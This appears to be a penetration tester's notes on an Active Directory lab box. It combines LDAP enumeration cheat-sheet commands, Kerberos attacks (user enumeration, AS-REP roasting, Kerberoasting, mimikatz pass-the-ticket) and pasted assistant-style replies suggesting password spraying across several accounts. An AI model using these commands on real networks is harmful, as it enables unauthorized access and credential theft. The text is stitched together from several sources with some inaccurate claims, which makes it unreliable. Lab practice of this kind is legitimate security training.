# What is LDAP Injection?

Many companies use LDAP services. LDAP serves as a repository for user authentication, and also enables a single sign-on (SSO) environment.  LDAP is most commonly used for privilege management, resource management, and access control.

LDAP Injection attacks are similar to SQL Injection attacks. These attacks abuse the parameters used in an LDAP query. In most cases, the application does not filter parameters correctly. This could lead to a vulnerable environment in which the hacker can inject malicious code.

LDAP exploits can result in exposure and theft of sensitive data. Advanced LDAP Injection techniques can also execute arbitrary commands. This lets them obtain unauthorized permissions and also alter LDAP tree information.

Environments that are most vulnerable to LDAP Injection attacks include ADAM and OpenLDAP.


➜  Administrator git:(main) 
    
    nmap -n -sV --script "ldap* and not brute" 10.10.11.42                      

PORT      STATE    SERVICE       VERSION
21/tcp    open     ftp           Microsoft ftpd
53/tcp    open     domain        Simple DNS Plus
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-12 21:47:08Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=administrator,DC=htb
|       ldapServiceName: administrator.htb:dc$@ADMINISTRATOR.HTB
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|   
|       dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=administrator,DC=htb
|       dnsHostName: dc.administrator.htb
|       defaultNamingContext: DC=administrator,DC=htb
|       currentTime: 20241112214726.0Z
|_      configurationNamingContext: CN=Configuration,DC=administrator,DC=htb
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
987/tcp   filtered unknown
1034/tcp  filtered zincite-a
1095/tcp  filtered nicelink
2288/tcp  filtered netml
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
3493/tcp  filtered nut
3659/tcp  filtered apple-sasl
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
32783/tcp filtered unknown
49175/tcp filtered unknown
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 147.53 seconds



Anonymous Access
Bypass TLS SNI check
According to this writeup just by accessing the LDAP server with an arbitrary domain name (like company.com) he was able to contact the LDAP service and extract information as an anonymous user:

    ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
    
Valid Credentials
If you have valid credentials to login into the LDAP server, you can dump all the information about the Domain Admin using:

ldapdomaindump :https://github.com/dirkjanm/ldapdomaindump
    
    pip3 install ldapdomaindump 
    ldapdomaindump <IP> [-r <IP>] -u '<domain>\<username>' -p '<password>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]

Python
You can try to enumerate a LDAP with or without credentials using python: pip3 install ldap3

First try to connect without credentials:

Copy
>>> import ldap3
>>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
>>> connection = ldap3.Connection(server)
>>> connection.bind()
True
>>> server.info
If the response is True like in the previous example, you can obtain some interesting data of the LDAP (like the naming context or domain name) server from:

Copy
>>> server.info
DSA info (from DSE):
Supported LDAP versions: 3
Naming contexts: 
dc=DOMAIN,dc=DOMAIN
Once you have the naming context you can make some more exciting queries. This simply query should show you all the objects in the directory:

Copy
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
True
>> connection.entries
Or dump the whole ldap:

Copy
>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
True
>>> connection.entries




# windapsearch
Windapsearch is a Python script useful to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries.

    # Get computers
    python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --computers
    # Get groups
    python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --groups
    # Get users
    python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
    # Get Domain Admins
    python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
    # Get Privileged Users
    python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --privileged-users




# ldapsearch
Check null credentials or if your credentials are valid:


    ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
    ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"

# CREDENTIALS NOT VALID RESPONSE
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v3839

 
 
 
If you find something saying that the "bind must be completed" means that the credentials are incorrect.

You can extract everything from a domain using:

    ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
    -x Simple Authentication
    -H LDAP Server
    -D My User
    -w My password
    -b Base site, all data from here will be given

    
    
Extract users:

    ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
    #Example: ldapsearch -x -H ldap://<IP> -D 'MYDOM\john' -w 'johnpassw' -b "CN=Users,DC=mydom,DC=local"
Extract computers:

    ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
Extract my info:

    ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
Extract Domain Admins:

    ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
Extract Domain Users:

    ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
Extract Enterprise Admins:

    ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
Extract Administrators:

    ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
Extract Remote Desktop Group:

    ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
To see if you have access to any password you can use grep after executing one of the queries:

    <ldapsearchcmd...> | grep -i -A2 -B2 "userpas"
Please, notice that the passwords that you can find here could not be the real ones...




# pbis
You can download pbis from here: https://github.com/BeyondTrust/pbis-open/ and it's usually installed in /opt/pbis.
Pbis allow you to get basic information easily:

    #Read keytab file
    ./klist -k /etc/krb5.keytab

    #Get known domains info
    ./get-status
    ./lsa get-status

    #Get basic metrics
    ./get-metrics
    ./lsa get-metrics

    #Get users
    ./enum-users
    ./lsa enum-users

    #Get groups
    ./enum-groups
    ./lsa enum-groups

    #Get all kind of objects
    ./enum-objects
    ./lsa enum-objects

    #Get groups of a user
    ./list-groups-for-user <username>
    ./lsa list-groups-for-user <username>
    #Get groups of each user
    ./enum-users | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do ./list-groups-for-user "$name"; echo -e "========================\n"; done

    #Get users of a group
    ./enum-members --by-name "domain admins"
    ./lsa enum-members --by-name "domain admins"
    #Get users of each group
    ./enum-groups | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do echo "$name"; ./enum-members --by-name "$name"; echo -e "========================\n"; done

    #Get description of each user
    ./adtool -a search-user --name CN="*" --keytab=/etc/krb5.keytab -n <Username> | grep "CN" | while read line; do
        echo "$line";
        ./adtool --keytab=/etc/krb5.keytab -n <username> -a lookup-object --dn="$line" --attr "description";
        echo "======================"
    done




LDAP Enumeration and Attacks
LDAP is used to query and manage AD objects like users, groups, and permissions. Here are some enumeration techniques and possible attacks:

Basic LDAP Enumeration
You can query LDAP to obtain information about users, groups, computers, and more. Tools like ldapsearch, nmap, or ldapdomaindump are useful here.

Using ldapsearch:

    ldapsearch -x -h 10.10.11.42 -D "CN=Olivia,CN=Users,DC=administrator,DC=htb" -w 'ichliebedich' -b "DC=administrator,DC=htb"
Replace "CN=Olivia,CN=Users,DC=administrator,DC=htb" with your distinguished name (DN) and -b with the base DN of the domain. This command queries all objects under the specified base.

Extract Sensitive Information with ldapdomaindump:

    ldapdomaindump -u "administrator.htb\Olivia" -p 'ichliebedich' -d 10.10.11.42
This tool generates HTML and JSON reports, detailing user accounts, groups, and more.

Attacking LDAP with Null Binds
If anonymous access is allowed, try accessing LDAP with no credentials:

    ldapsearch -x -h 10.10.11.42 -b "DC=administrator,DC=htb"
This may reveal valuable information like usernames, group memberships, and policies without authentication.

2. Kerberos Attacks
Kerberos is a network authentication protocol that uses ticketing. Attacks often target weak encryption methods or improperly managed accounts.

Kerberos Pre-Authentication Enumeration
If you know valid usernames in the domain, you can attempt Kerberos authentication with them to confirm which ones are active without needing passwords.

User Enumeration with kerbrute:
    
    kerbrute userenum -d administrator.htb --dc 10.10.11.42 username_list.txt
kerbrute will indicate which usernames are valid by sending login requests and checking responses.
AS-REP Roasting
This attack targets accounts with Kerberos pre-authentication disabled. When pre-auth is disabled, attackers can request encrypted Ticket Granting Tickets (TGTs) without knowing the password and then try to crack them offline.

Using Impacket’s GetNPUsers.py:
    
    GetNPUsers.py administrator.htb/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.42
If successful, this will output hashes of accounts that can be cracked offline with tools like hashcat.
Kerberoasting
Kerberoasting targets service accounts, which often have weaker passwords. Attackers request a service ticket (TGS) and attempt to crack it offline.

Enumerate Service Principal Names (SPNs):

    ldapsearch -x -h 10.10.11.42 -D "CN=Olivia,CN=Users,DC=administrator,DC=htb" -w 'ichliebedich' -b "DC=administrator,DC=htb" "(servicePrincipalName=*)"
Requesting and Cracking Service Tickets with Impacket’s GetUserSPNs.py:

    GetUserSPNs.py administrator.htb/Olivia:ichliebedich -dc-ip 10.10.11.42 -request
The output is a service ticket hash, which can be cracked offline.

Pass-the-Ticket (PtT) Attack
If you manage to capture a Ticket Granting Ticket (TGT) or a Ticket Granting Service (TGS), you can impersonate the user and access services.

Using mimikatz:
Export the ticket from klist:
    
    klist -e
Pass the ticket with mimikatz:
    
    sekurlsa::tickets /export
Use the ticket with psexec.py from Impacket:
    
    psexec.py -k -no-pass administrator.htb/Olivia@10.10.11.42
Tools for LDAP and Kerberos Attacks
LDAP Enumeration: ldapsearch, ldapdomaindump, nmap (for LDAP-specific NSE scripts).
Kerberos Enumeration and Attacks: kerbrute, Impacket suite (GetNPUsers.py, GetUserSPNs.py), hashcat, mimikatz.
Each of these attacks requires the right permissions and contexts, so be sure to respect authorization limits and ethical guidelines. Let me know if you need specific command usage or more on configuring these tools!













Try Using the Full UPN (User Principal Name)
Instead of using CN=Olivia, you could try using the full UPN format (which is similar to an email address) as the username:

Olivia@administrator.htb
If Olivia is a user in the administrator.htb domain, this format might work.

Updated Command Example:
ldapsearch -x -H ldap://10.10.11.42 -D "Olivia@administrator.htb" -w "ichliebedich" -b "dc=administrator,dc=htb" "(objectClass=user)"
3. Check for Typo in the Password
Ensure that there are no typographical errors in the password (ichliebedich). It might also help to ensure that the password does not have any extra spaces, especially at the end.

4. Check the Account Lock or Permissions
It's possible that the Olivia account may be locked out or disabled in Active Directory. If you have the necessary permissions, check the status of the account and reset the password if needed.

5. Use -D with an Admin Account
If Olivia is not a privileged user or does not have access to query the directory, you can try binding with an admin account (such as Administrator) to see if you get any different results:

ldapsearch -x -H ldap://10.10.11.42 -D "Administrator@administrator.htb" -w "password" -b "dc=administrator,dc=htb" "(objectClass=user)"
Make sure to replace "password" with the actual password of the Administrator account.

6. Debugging with -LLL
You can also use the -LLL flag to simplify the output and help you debug the LDAP query more effectively:

ldapsearch -LLL -x -H ldap://10.10.11.42 -D "Olivia@administrator.htb" -w "ichliebedich" -b "dc=administrator,dc=htb" "(objectClass=user)"
This will show a more concise output and help you focus on the results rather than LDAP-specific metadata.












To perform the LDAP query for the usernames that are identified as valid (i.e., michael, emily, benjamin, olivia, ethan), you can run individual LDAP queries for each of them, replacing the username and password accordingly.

Here's how you can format the LDAP search for each of these usernames:

1. For michael@administrator.htb
ldapsearch -x -H ldap://10.10.11.42 -D "michael@administrator.htb" -w "ichliebedich" -b "dc=administrator,dc=htb" "(objectClass=user)"
2. For emily@administrator.htb
ldapsearch -x -H ldap://10.10.11.42 -D "emily@administrator.htb" -w "ichliebedich" -b "dc=administrator,dc=htb" "(objectClass=user)"
3. For benjamin@administrator.htb
ldapsearch -x -H ldap://10.10.11.42 -D "benjamin@administrator.htb" -w "ichliebedich" -b "dc=administrator,dc=htb" "(objectClass=user)"
4. For olivia@administrator.htb
ldapsearch -x -H ldap://10.10.11.42 -D "olivia@administrator.htb" -w "ichliebedich" -b "dc=administrator,dc=htb" "(objectClass=user)"
5. For ethan@administrator.htb
ldapsearch -x -H ldap://10.10.11.42 -D "ethan@administrator.htb" -w "ichliebedich" -b "dc=administrator,dc=htb" "(objectClass=user)"
Explanation:
-D "username@administrator.htb": Specifies the user you want to bind with (e.g., michael@administrator.htb).
-w "ichliebedich": The password for each user.
-b "dc=administrator,dc=htb": The base DN for the LDAP search, which seems to be the root domain for administrator.htb.
(objectClass=user): Filters the search to only return user objects.
You should run each of these commands one by one. If the credentials and the DN are correct, it will return user information for each account. If you encounter errors, make sure the credentials and domain are accurate, and the account you are binding with has the necessary permissions.